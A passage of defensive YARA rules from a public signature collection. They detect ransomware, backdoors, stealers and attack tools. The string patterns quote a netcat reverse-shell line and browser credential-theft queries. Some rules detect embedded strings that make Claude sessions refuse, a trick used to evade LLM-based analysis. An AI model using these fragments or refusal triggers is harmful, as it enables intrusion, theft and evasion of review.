		modified = "2023-12-05"
		reference = "https://csirt.egi.eu/academic-data-centers-abused-for-crypto-currency-mining/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/crime_academic_data_centers_camp_may20.yar#L20-L35"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		hash = "0efdd382872f0ff0866e5f68f0c66c01fcf4f9836a78ddaa5bbb349f20353897"
		logic_hash = "a73883f9fdf3d53694d9f9efec5f8f15994c5fd80c5f2a87b1741db6b954a023"
		score = 75
		quality = 85
		tags = "FILE"

	strings:
		$sc1 = { C6 45 F1 00 C6 45 F2 0A C6 45 F3 0A C6 45 F4 4A 
               C6 45 F5 04 C6 45 F6 06 C6 45 F7 1B C6 45 F8 01 }
		$sc2 = { 01 48 39 EB 75 EA 48 83 C4 08 5B 5D 41 5C 41 5D }

	condition:
		uint16( 0 ) == 0x457f and filesize < 10KB and all of them
}

rule SIGNATURE_BASE_SUSP_Anydesk_Compromised_Certificate_Jan24_1 : FILE
{
	meta:
		description = "Detects binaries signed with a compromised signing certificate of AnyDesk that aren't AnyDesk itself (philandro Software GmbH, 0DBF152DEAF0B981A8A938D53F769DB8; strict version)"
		author = "Florian Roth"
		id = "8d172b04-f7f7-54df-b30c-3ee17d3cca12"
		date = "2024-02-02"
		modified = "2024-04-24"
		reference = "https://anydesk.com/en/public-statement"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/gen_anydesk_compromised_cert_feb23.yar#L19-L36"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "1b2268b1efa09ee8578f4c1ae07617ac6bebeacd3ed50598a2fc2ec4d709baa7"
		score = 75
		quality = 85
		tags = "FILE"

	strings:
		$a1 = "AnyDesk Software GmbH" wide

	condition:
		uint16( 0 ) == 0x5a4d and not $a1 and for any i in ( 0 .. pe.number_of_signatures ) : ( pe.signatures [ i ] . issuer contains "DigiCert Trusted G4 Code Signing RSA4096 SHA384 2021 CA1" and pe.signatures [ i ] . serial == "0d:bf:15:2d:ea:f0:b9:81:a8:a9:38:d5:3f:76:9d:b8" )
}
rule SIGNATURE_BASE_SUSP_Anydesk_Compromised_Certificate_Jan24_2 : FILE
{
	meta:
		description = "Detects binaries signed with a compromised signing certificate of AnyDesk that aren't AnyDesk itself (philandro Software GmbH, 0DBF152DEAF0B981A8A938D53F769DB8; permissive version)"
		author = "Florian Roth"
		id = "a41af8d8-ebdf-5a2f-8cf5-abd4587bdfc5"
		date = "2024-02-02"
		modified = "2024-04-24"
		reference = "https://anydesk.com/en/public-statement"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/gen_anydesk_compromised_cert_feb23.yar#L38-L56"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "86f708233d5a6a46d367430dcc65b128e8dc7ec24eda774ff3860101cc16c9fc"
		score = 65
		quality = 85
		tags = "FILE"

	strings:
		$sc1 = { 0D BF 15 2D EA F0 B9 81 A8 A9 38 D5 3F 76 9D B8 }
		$s2 = "DigiCert Trusted G4 Code Signing RSA4096 SHA384 2021 CA1"
		$f1 = "AnyDesk Software GmbH" wide

	condition:
		uint16( 0 ) == 0x5a4d and filesize < 20000KB and all of ( $s* ) and not 1 of ( $f* )
}

rule SIGNATURE_BASE_SUSP_Anydesk_Compromised_Certificate_Jan24_3 : FILE
{
	meta:
		description = "Detects binaries signed with a compromised signing certificate of AnyDesk after it was revoked (philandro Software GmbH, 0DBF152DEAF0B981A8A938D53F769DB8; version that uses dates for validation)"
		author = "Florian Roth"
		id = "9610e61c-25d7-53e8-ba3f-b78b3d108aa3"
		date = "2024-02-02"
		modified = "2024-04-24"
		reference = "https://anydesk.com/en/public-statement"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/gen_anydesk_compromised_cert_feb23.yar#L58-L77"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "fdd1068abfba52c9a40fd2b6628a5c67775eb31815e6d53bfc4655080d9b240e"
		score = 75
		quality = 85
		tags = "FILE"

	condition:
		uint16( 0 ) == 0x5a4d and for any i in ( 0 .. pe.number_of_signatures ) : ( pe.signatures [ i ] . issuer contains "DigiCert Trusted G4 Code Signing RSA4096 SHA384 2021 CA1" and pe.signatures [ i ] . serial == "0d:bf:15:2d:ea:f0:b9:81:a8:a9:38:d5:3f:76:9d:b8" and ( pe.signatures [ i ] . not_before > 1706486400 or pe.timestamp > 1706486400 ) )
}
rule SIGNATURE_BASE_EXPL_Zoho_RCE_Fix_Lines_Dec21_1 : FILE
{
	meta:
		description = "Detects lines in log lines of Zoho products that indicate RCE fixes (silent removal of evidence)"
		author = "Florian Roth (Nextron Systems)"
		id = "633287e3-a377-5b3c-8520-a7790168eff5"
		date = "2021-12-06"
		modified = "2023-12-05"
		reference = "https://twitter.com/cyb3rops/status/1467784104930385923"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/gen_zoho_rcef_logs.yar#L2-L27"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "e6d9c3364da57c03a5e838f485deefabec2f3ec67d19a9017e564ba702a72d03"
		score = 65
		quality = 85
		tags = "FILE"

	strings:
		$s1 = "RCEF="
		$sa1 = "\"attackStatus\"\\:\"active\""
		$sa2 = "\"attackStatus\":\"active\""
		$sd1 = "deletedCount"
		$sd_fp1 = "\"deletedCount\"\\:0"
		$sd_fp2 = "\"deletedCount\":0"

	condition:
		filesize < 6MB and $s1 and ( 1 of ( $sa* ) or ( $sd1 and not 1 of ( $sd_fp* ) ) )
}
rule SIGNATURE_BASE_SUSP_Claude_Refusal_Magic_String_Jan26
{
	meta:
		description = "Detects refusal magic string that cause Claude sessions to be terminated. This might indicate that a file tries to prevent being analyzed by LLM agents."
		author = "Marius Benthin"
		id = "7a164817-9e90-52f6-a3cb-e6965ee1cc54"
		date = "2026-01-29"
		modified = "2026-05-15"
		reference = "https://x.com/williballenthin/status/2014687699165135150"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/susp_claude_magic_strings.yar#L1-L14"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		hash = "ffa48ed4b7b48897f6756c4222b2606399de0bca627cedfddf61e69986580430"
		logic_hash = "ae5b451168d03440f84b89d96db2688f828e5dcbcdd1121edf3fb973571d2dbd"
		score = 75
		quality = 83
		tags = ""

	strings:
		$x1 = "ANTHROPIC_MAGIC_STRING_TRIGGER_REFUSAL_" ascii wide nocase

	condition:
		$x1
}
rule SIGNATURE_BASE_MAL_Claude_Refusal_Magic_String_Jan26
{
	meta:
		description = "Detects Base64 variations of refusal magic string that cause Claude sessions to be terminated. This might indicate that a file tries to prevent being analyzed by LLM agents."
		author = "Marius Benthin"
		id = "8f0351b7-56b8-5059-8c1e-e8d87fa0ca91"
		date = "2026-01-29"
		modified = "2026-05-15"
		reference = "Internal Research"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/susp_claude_magic_strings.yar#L16-L28"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "e1c070b77e3568966f605fa47a2b3be917065954bc157e3721ff2fb3ac4d72f7"
		score = 80
		quality = 85
		tags = ""

	strings:
		$xb1 = "ANTHROPIC_MAGIC_STRING_TRIGGER_REFUSAL_" ascii wide base64 base64wide

	condition:
		$xb1
}
rule SIGNATURE_BASE_SUSP_Claude_Redacted_Thinking_Magic_String_Jan26_1
{
	meta:
		description = "Detects redacted thinking magic string that cause Claude sessions to be terminated. This might indicate that a file tries to prevent being analyzed by LLM agents."
		author = "Marius Benthin"
		id = "623de3f9-ea03-5b6a-bb24-14b4a6d4a7c9"
		date = "2026-01-29"
		modified = "2026-05-15"
		reference = "Internal Research"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/susp_claude_magic_strings.yar#L30-L43"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		hash = "ffa48ed4b7b48897f6756c4222b2606399de0bca627cedfddf61e69986580430"
		logic_hash = "02b85e9df893d6be91f8053ac67884e5a24893ef225ca0e7b3878b38afb79420"
		score = 65
		quality = 83
		tags = ""

	strings:
		$x1 = "ANTHROPIC_MAGIC_STRING_TRIGGER_REDACTED_THINKING_" ascii wide nocase

	condition:
		$x1
}
rule SIGNATURE_BASE_SUSP_Claude_Redacted_Thinking_Magic_String_Jan26_2
{
	meta:
		description = "Detects Base64 variations of redacted thinking magic string that cause Claude sessions to be terminated. This might indicate that a file tries to prevent being analyzed by LLM agents."
		author = "Marius Benthin"
		id = "453ad61a-838f-529a-b119-1dd3ec559069"
		date = "2026-01-29"
		modified = "2026-05-15"
		reference = "Internal Research"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/susp_claude_magic_strings.yar#L45-L57"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "3b901ffeaff1e4bef579df00e4e99fe8f9eb4ae9ee8e8bde7a730f0fd4646762"
		score = 75
		quality = 85
		tags = ""

	strings:
		$xb1 = "ANTHROPIC_MAGIC_STRING_TRIGGER_REDACTED_THINKING_" ascii wide base64 base64wide

	condition:
		$xb1
}
rule SIGNATURE_BASE_MAL_RANSOM_ELF_Esxi_Attacks_Feb23_1 : FILE
{
	meta:
		description = "Detects ransomware exploiting and encrypting ESXi servers"
		author = "Florian Roth"
		id = "d0a813aa-41f8-57df-b708-18ccb0d7a3e5"
		date = "2023-02-04"
		modified = "2023-12-05"
		reference = "https://www.bleepingcomputer.com/forums/t/782193/esxi-ransomware-help-and-support-topic-esxiargs-args-extension/page-14"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/mal_ransom_esxi_attacks_feb23.yar#L30-L56"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		hash = "11b1b2375d9d840912cfd1f0d0d04d93ed0cddb0ae4ddb550a5b62cd044d6b66"
		logic_hash = "27ff018574323c10821993c30cf74de15121caa92a308fbcae4eceae954e63b6"
		score = 85
		quality = 85
		tags = "FILE"

	strings:
		$x1 = "usage: encrypt <public_key> <file_to_encrypt> [<enc_step>] [<enc_size>] [<file_size>]" ascii fullword
		$x2 = "[ %s ] - FAIL { Errno: %d }" ascii fullword
		$s1 = "lPEM_read_bio_RSAPrivateKey" ascii fullword
		$s2 = "lERR_get_error" ascii fullword
		$s3 = "get_pk_data: key file is empty!" ascii fullword
		$op1 = { 8b 45 a8 03 45 d0 89 45 d4 8b 45 a4 69 c0 07 53 65 54 89 45 a8 8b 45 a8 c1 c8 19 }
		$op2 = { 48 89 95 40 fd ff ff 48 83 bd 40 fd ff ff 00 0f 85 2e 01 00 00 48 8b 9d 50 ff ff ff 48 89 9d 30 fd ff ff 48 83 bd 30 fd ff ff 00 78 13 f2 48 0f 2a 85 30 fd ff ff }
		$op3 = { 31 55 b4 f7 55 b8 8b 4d ac 09 4d b8 8b 45 b8 31 45 bc c1 4d bc 13 c1 4d b4 1d }

	condition:
		uint16( 0 ) == 0x457f and filesize < 200KB and ( 1 of ( $x* ) or 3 of them ) or 4 of them
}
rule SIGNATURE_BASE_APT_PY_Esxi_Backdoor_Dec22 : FILE
{
	meta:
		description = "Detects Python backdoor found on ESXi servers"
		author = "Florian Roth"
		id = "f0a3b9b9-0031-5d9f-97f8-70f83863ee63"
		date = "2022-12-14"
		modified = "2023-12-05"
		reference = "https://blogs.juniper.net/en-us/threat-research/a-custom-python-backdoor-for-vmware-esxi-servers"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/mal_ransom_esxi_attacks_feb23.yar#L58-L71"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "86b628f007720aa706c30d91e845d867ed481d1e99bcc9315c84a4e0b7b1b2a6"
		score = 85
		quality = 85
		tags = "FILE"

	strings:
		$x1 = "cmd = str(base64.b64decode(encoded_cmd), " ascii
		$x2 = "sh -i 2>&1 | nc %s %s > /tmp/" ascii

	condition:
		filesize < 10KB and 1 of them or all of them
}
rule SIGNATURE_BASE_APT_SH_Esxi_Backdoor_Dec22 : FILE
{
	meta:
		description = "Detects malicious script found on ESXi servers"
		author = "Florian Roth"
		id = "983ac20c-2e61-5365-8849-b3aeb999f909"
		date = "2022-12-14"
		modified = "2023-12-05"
		reference = "https://blogs.juniper.net/en-us/threat-research/a-custom-python-backdoor-for-vmware-esxi-servers"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/mal_ransom_esxi_attacks_feb23.yar#L73-L87"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "155a90a6c55b99285555634d91a66fca9c7e7297f05314fa4d6ce1d84257ee11"
		score = 75
		quality = 85
		tags = "FILE"

	strings:
		$x1 = "mv /bin/hostd-probe.sh /bin/hostd-probe.sh.1" ascii fullword
		$x2 = "/bin/nohup /bin/python -u /store/packages/vmtools.py" ascii
		$x3 = "/bin/rm /bin/hostd-probe.sh.1"

	condition:
		filesize < 10KB and 1 of them
}
rule SIGNATURE_BASE_MAL_RANSOM_SH_Esxi_Attacks_Feb23_2 : FILE
{
	meta:
		description = "Detects script used in ransomware attacks exploiting and encrypting ESXi servers"
		author = "Florian Roth"
		id = "d1282dee-0496-52f1-a2b7-27657ab4df8c"
		date = "2023-02-06"
		modified = "2023-12-05"
		reference = "https://dev.to/xakrume/esxiargs-encryption-malware-launches-massive-attacks-against-vmware-esxi-servers-pfe"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/mal_ransom_esxi_attacks_feb23.yar#L89-L101"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "3f240784873a0239cbf61f7f420fdd72b8992d5943ffc3d4dcad43c836569f4d"
		score = 85
		quality = 85
		tags = "FILE"

	strings:
		$x1 = "echo \"START ENCRYPT: $file_e SIZE: $size_kb STEP SIZE: " ascii

	condition:
		filesize < 10KB and 1 of them
}
rule SIGNATURE_BASE_SUSP_Esxiargs_Endpoint_Conf_Aug23 : FILE
{
	meta:
		description = "Detects indicators found in endpoint.conf files as modified by actors in the ESXiArgs campaign"
		author = "Florian Roth"
		id = "3e0b5dbf-7c5b-5599-823a-ce35fbdbe64b"
		date = "2023-08-04"
		modified = "2023-12-05"
		reference = "https://www.bleepingcomputer.com/forums/t/782193/esxi-ransomware-help-and-support-topic-esxiargs-args-extension/page-47"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/mal_ransom_esxi_attacks_feb23.yar#L103-L120"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "794d460eec0e2f0b48e6ced94b125a1e48acde6be6281866e0b4a2ae6c2d3b51"
		score = 75
		quality = 85
		tags = "FILE"

	strings:
		$a1 = "/client/clients.xml" ascii
		$a2 = "/var/run/vmware/proxy-sdk-tunnel" ascii fullword
		$a3 = "redirect" ascii fullword
		$a4 = "allow" ascii fullword
		$s1 = " local 8008 allow allow"

	condition:
		filesize < 2KB and all of them
}
rule SIGNATURE_BASE_APT_MAL_Falsefont_Backdoor_Jan24 : FILE
{
	meta:
		description = "Detects FalseFont backdoor, related to Peach Sandstorm APT"
		author = "X__Junior, Jonathan Peters"
		id = "b6a3efff-2abf-5ac1-9a2b-c7b30b51f92c"
		date = "2024-01-11"
		modified = "2024-04-24"
		reference = "https://twitter.com/MsftSecIntel/status/1737895710169628824"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/apt_peach_sandstorm.yar#L1-L31"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		hash = "364275326bbfc4a3b89233dabdaf3230a3d149ab774678342a40644ad9f8d614"
		logic_hash = "9a1b3779b63dd7fa8ddc84067dec09542518e9acebbf5d3b45cb75ec4add1158"
		score = 80
		quality = 85
		tags = "FILE"

	strings:
		$x1 = "Agent.Core.WPF.App" ascii
		$x2 = "3EzuNZ0RN3h3oV7rzILktSHSaHk+5rtcWOr0mlA1CUA=" wide
		$x3 = "viOIZ9cX59qDDjMHYsz1Yw==" wide
		$sa1 = "StopSendScreen" wide
		$sa2 = "Decryption failed :(" wide
		$sb1 = "{0}     {1}     {2}     {3}" wide
		$sb2 = "\\BraveSoftware\\Brave-Browser\\User Data\\" wide
		$sb3 = "select * from logins" wide
		$sb4 = "Loginvault.db" wide
		$sb5 = "password_value" wide

	condition:
		uint16( 0 ) == 0x5a4d and ( 1 of ( $x* ) or all of ( $sa* ) or all of ( $sb* ) or ( 1 of ( $sa* ) and 4 of ( $sb* ) ) )
}
rule SIGNATURE_BASE_MAL_Go_Modbus_Jul24_1 : FILE
{
	meta:
		description = "Detects characteristics reported by Dragos for FrostyGoop ICS malware"
		author = "Florian Roth"
		id = "4a1e6bbe-d743-5394-b207-e417b64fa76d"
		date = "2024-07-23"
		modified = "2024-07-24"
		reference = "https://hub.dragos.com/hubfs/Reports/Dragos-FrostyGoop-ICS-Malware-Intel-Brief-0724_.pdf"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/mal_go_modbus.yar#L2-L28"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		hash = "5d2e4fd08f81e3b2eb2f3eaae16eb32ae02e760afc36fa17f4649322f6da53fb"
		logic_hash = "d992c8159deca0ed2b2a33da3c31fdf0efa9a09ba941d059fa7fc1bad458aed1"
		score = 75
		quality = 85
		tags = "FILE"

	strings:
		$a1 = "Go build"
		$sa1 = "github.com/rolfl/modbus"
		$sb1 = "main.TaskList.executeCommand"
		$sb2 = "main.TargetList.getTargetIpList"
		$sb3 = "main.TaskList.getTaskIpList"
		$sb4 = "main.CycleInfo" fullword

	condition:
		filesize < 30MB and ( $sa1 and 3 of ( $sb* ) ) or 4 of them
}
rule SIGNATURE_BASE_MAL_Passwordstate_Moserware_Backdoor_Apr21_1 : FILE
{
	meta:
		description = "Detects backdoor used in Passwordstate incident"
		author = "Florian Roth (Nextron Systems)"
		id = "061de3ae-c404-5e4a-a16b-b3b208b1ae7f"
		date = "2021-04-25"
		modified = "2023-12-05"
		reference = "https://thehackernews.com/2021/04/passwordstate-password-manager-update.html"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/mal_passwordstate_backdoor.yar#L1-L24"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		hash = "c2169ab4a39220d21709964d57e2eafe4b68c115061cbb64507cfbbddbe635c6"
		hash = "f23f9c2aaf94147b2c5d4b39b56514cd67102d3293bdef85101e2c05ee1c3bf9"
		logic_hash = "46bf5b7f4f75997535742021d1d5c2129daae0b3836c08383058e5e5b8e27d93"
		score = 75
		quality = 85
		tags = "FILE"

	strings:
		$x1 = "https://passwordstate-18ed2.kxcdn.com" wide
		$s1 = " ProxyUserName, ProxyPassword FROM [SystemSettings]" wide fullword
		$s2 = "PasswordstateService.Passwordstate.Crypto" wide
		$s3 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.128 Safari" wide fullword
		$op1 = { 00 4c 00 4e 00 43 00 4c 00 49 00 31 00 31 00 3b 00 00 17 }
		$op2 = { 4c 00 49 00 31 00 31 00 3b 00 00 17 50 00 72 00 }
		$op3 = { 61 00 74 00 65 00 2d 00 31 00 38 00 65 00 64 00 32 00 2e 00 6b 00 78 00 }

	condition:
		uint16( 0 ) == 0x5a4d and filesize < 200KB and 1 of ( $x* ) or 3 of them
}
rule SIGNATURE_BASE_HKTL_Adaptixc2_Beacon_Apr26 : FILE
{
	meta:
		description = "Detects the Windows beacon of the AdaptixC2 post-exploitation framework by its stock Itanium-ABI RTTI type names and default HTTP heartbeat header. Matches an unmodified build regardless of operator."
		author = "The Hunters Ledger"
		id = "952a09e1-dbbd-5758-ab76-bb9f215d96b5"
		date = "2026-04-30"
		modified = "2026-09-13"
		reference = "https://github.com/Adaptix-Framework/AdaptixC2"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/hktl_adaptixc2.yar#L2-L24"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		hash = "358edb5d7e3e38c2da0a2ef323a281283aa96d47a8649014d114923b06866c12"
		logic_hash = "1fe5dc44d17a951916752528e338dd2e3e4a2172b2c9b791315a88707c67bc6f"
		score = 80
		quality = 85
		tags = "FILE"
		license = "CC BY 4.0 - https://creativecommons.org/licenses/by/4.0/"

	strings:
		$a1 = "9Connector" ascii
		$a2 = "13ConnectorHTTP" ascii
		$a3 = "X-Beacon-Id" ascii
		$s1 = "GetVersions" ascii
		$s2 = "Mingw-w64 runtime failure:" ascii

	condition:
		uint16( 0 ) == 0x5a4d and filesize < 300KB and all of ( $a* ) and 1 of ( $s* )
}
rule SIGNATURE_BASE_HKTL_Koh_Tokenstealer : FILE
{
	meta:
		description = "The TypeLibGUID present in a .NET binary maps directly to the ProjectGuid found in the '.csproj' file of a .NET project."
		author = "Will Schroeder (@harmj0y)"
		id = "76b6cc9f-5db7-5e9b-939c-e713bad8137a"
		date = "2022-07-09"
		modified = "2023-12-05"
		reference = "https://github.com/GhostPack/Koh"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/gen_hktl_koh_tokenstealer.yar#L2-L18"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "e2c4d948e23f1a3a92689f35fedde6e041d09cd88deac9ff3249556be0b8f789"
		score = 75
		quality = 85
		tags = "FILE"

	strings:
		$x_typelibguid = "4d5350c8-7f8c-47cf-8cde-c752018af17e" ascii
		$s1 = "[*] Already SYSTEM, not elevating" wide fullword
		$s2 = "S-1-[0-59]-\\d{2}-\\d{8,10}-\\d{8,10}-\\d{8,10}-[1-9]\\d{2}" wide
		$s3 = "0x[0-9A-Fa-f]+$" wide
		$s4 = "\\Koh.pdb" ascii

	condition:
		uint16( 0 ) == 0x5A4D and 1 of ( $x* ) or 3 of them
}
rule SIGNATURE_BASE_APT_MAL_LNX_Turla_Apr202004_1 : FILE
{
	meta:
		description = "Detects Turla Linux malware x64 x32"
		author = "Leonardo S.p.A."
		id = "2da75433-b1c1-51b3-8f7a-a4442ca3de96"
		date = "2020-04-24"
		modified = "2023-12-05"
		reference = "https://www.leonardocompany.com/en/news-and-stories-detail/-/detail/knowledge-the-basis-of-protection"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/apt_turla_penquin.yar#L2-L33"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		hash = "67d9556c695ef6c51abf6fbab17acb3466e3149cf4d20cb64d6d34dc969b6502"
		hash = "8ccc081d4940c5d8aa6b782c16ed82528c0885bbb08210a8d0a8c519c54215bc"
		hash = "8856a68d95e4e79301779770a83e3fad8f122b849a9e9e31cfe06bf3418fa667"
		hash = "1d5e4466a6c5723cd30caf8b1c3d33d1a3d4c94c25e2ebe186c02b8b41daf905"
		hash = "2dabb2c5c04da560a6b56dbaa565d1eab8189d1fa4a85557a22157877065ea08"
		hash = "3e138e4e34c6eed3506efc7c805fce19af13bd62aeb35544f81f111e83b5d0d4"
		hash = "5a204263cac112318cd162f1c372437abf7f2092902b05e943e8784869629dd8"
		hash = "8856a68d95e4e79301779770a83e3fad8f122b849a9e9e31cfe06bf3418fa667"
		hash = "d49690ccb82ff9d42d3ee9d7da693fd7d302734562de088e9298413d56b86ed0"
		logic_hash = "1e07963c492f1e6264f01ee292e40b188ca325b76005d9d48e6dc198cb9bdcf4"
		score = 75
		quality = 85
		tags = "FILE"

	strings:
		$ = "/root/.hsperfdata" ascii fullword
		$ = "Desc| Filename | size |state|" ascii fullword
		$ = "VS filesystem: %s" ascii fullword
		$ = "File already exist on remote filesystem !" ascii fullword
		$ = "/tmp/.sync.pid" ascii fullword
		$ = "rem_fd: ssl " ascii fullword
		$ = "TREX_PID=%u" ascii fullword
		$ = "/tmp/.xdfg" ascii fullword
		$ = "__we_are_happy__" ascii
		$ = "/root/.sess" ascii fullword

	condition:
		uint16( 0 ) == 0x457f and filesize < 5000KB and 4 of them
}
rule SIGNATURE_BASE_APT_MAL_LNX_Turla_Apr202004_1_Opcode : FILE
{
	meta:
		description = "Detects Turla Linux malware x64 x32"
		author = "Leonardo S.p.A."
		id = "03043f59-c81a-5423-bec1-6cd88f6e3c52"
		date = "2020-04-24"
		modified = "2023-12-05"
		reference = "https://www.leonardocompany.com/en/news-and-stories-detail/-/detail/knowledge-the-basis-of-protection"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/apt_turla_penquin.yar#L35-L66"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		hash = "67d9556c695ef6c51abf6fbab17acb3466e3149cf4d20cb64d6d34dc969b6502"
		hash = "8ccc081d4940c5d8aa6b782c16ed82528c0885bbb08210a8d0a8c519c54215bc"
		hash = "8856a68d95e4e79301779770a83e3fad8f122b849a9e9e31cfe06bf3418fa667"
		hash = "1d5e4466a6c5723cd30caf8b1c3d33d1a3d4c94c25e2ebe186c02b8b41daf905"
		hash = "2dabb2c5c04da560a6b56dbaa565d1eab8189d1fa4a85557a22157877065ea08"
		hash = "3e138e4e34c6eed3506efc7c805fce19af13bd62aeb35544f81f111e83b5d0d4"
		hash = "5a204263cac112318cd162f1c372437abf7f2092902b05e943e8784869629dd8"
		hash = "8856a68d95e4e79301779770a83e3fad8f122b849a9e9e31cfe06bf3418fa667"
		hash = "d49690ccb82ff9d42d3ee9d7da693fd7d302734562de088e9298413d56b86ed0"
		logic_hash = "19524e6ec3b0d49ff9c85ce361ef1922b92e4f7876ddb7d6c9b209b5357080e3"
		score = 75
		quality = 85
		tags = "FILE"

	strings:
		$op0 = { 8D 41 05 32 06 48 FF C6 88 81 E0 80 69 00 }
		$op1 = { 48FFC14883F94975E9 }
		$op2 = { C7 05 9B 7D 29 00 1D 00 00 00 C7 05 2D 7B 29 00 65 74 68 30 C6 05 2A 7B 29 00 00 E8 }
		$op3 = { BF FF FF FF FF E8 96 9D 0A 00 90 90 90 90 90 90 90 90 90 90 89 F0}
		$op4 = { 88D380C305329AC1D60C08889A60A10F084283FA0876E9 }
		$op5 = { 8B 8D 50 DF FF FF B8 09 00 00 00 89 44 24 04 89 0C 24 E8 DD E5 02 00 }
		$op6 = { 8D 5A 05 32 9A 60 26 0C 08 88 9A 20 F4 0E 08 42 83 FA 48 76 EB }
		$op7 = { 8D 4A 05 32 8A 25 26 0C 08 88 8A 20 F4 0E 08 42 83 FA 08 76 EB}

	condition:
		uint16( 0 ) == 0x457f and filesize < 5000KB and 2 of them
}
rule SIGNATURE_BASE_APT_NK_Lazarus_RC4_Loop : FILE
{
	meta:
		description = "Detects RC4 loop in Lazarus Group implant"
		author = "f-secure "
		id = "a9503795-b4b8-505e-a1bf-df64ec8c1c32"
		date = "2020-06-10"
		modified = "2023-12-05"
		reference = "https://labs.f-secure.com/publications/ti-report-lazarus-group-cryptocurrency-vertical"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/apt_lazarus_aug20.yar#L2-L15"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "b0e96bfff924a0c9b39e1ab03097ae0790743417d9da70917d64bc238905971e"
		score = 75
		quality = 85
		tags = "FILE"

	strings:
		$str_rc4_loop = { 41 FE 8? 00 01 00 00 45 0F B6 ?? 00 01 00 00 48 
                        FF C? 43 0F B6 0? ?? 41 00 8? 01 01 00 00 41 0F 
                        B6 ?? 01 01 00 00 }

	condition:
		int16 ( 0 ) == 0x5a4d and filesize < 3000KB and $str_rc4_loop
}
rule SIGNATURE_BASE_APT_NK_Lazarus_Network_Backdoor_Unpacked : FILE
{
	meta:
		description = "Detects unpacked variant of Lazarus Group network backdoor"
		author = "f-secure"
		id = "8eda9e74-1a19-5510-82d8-cd2eb324629c"
		date = "2020-06-10"
		modified = "2023-12-05"
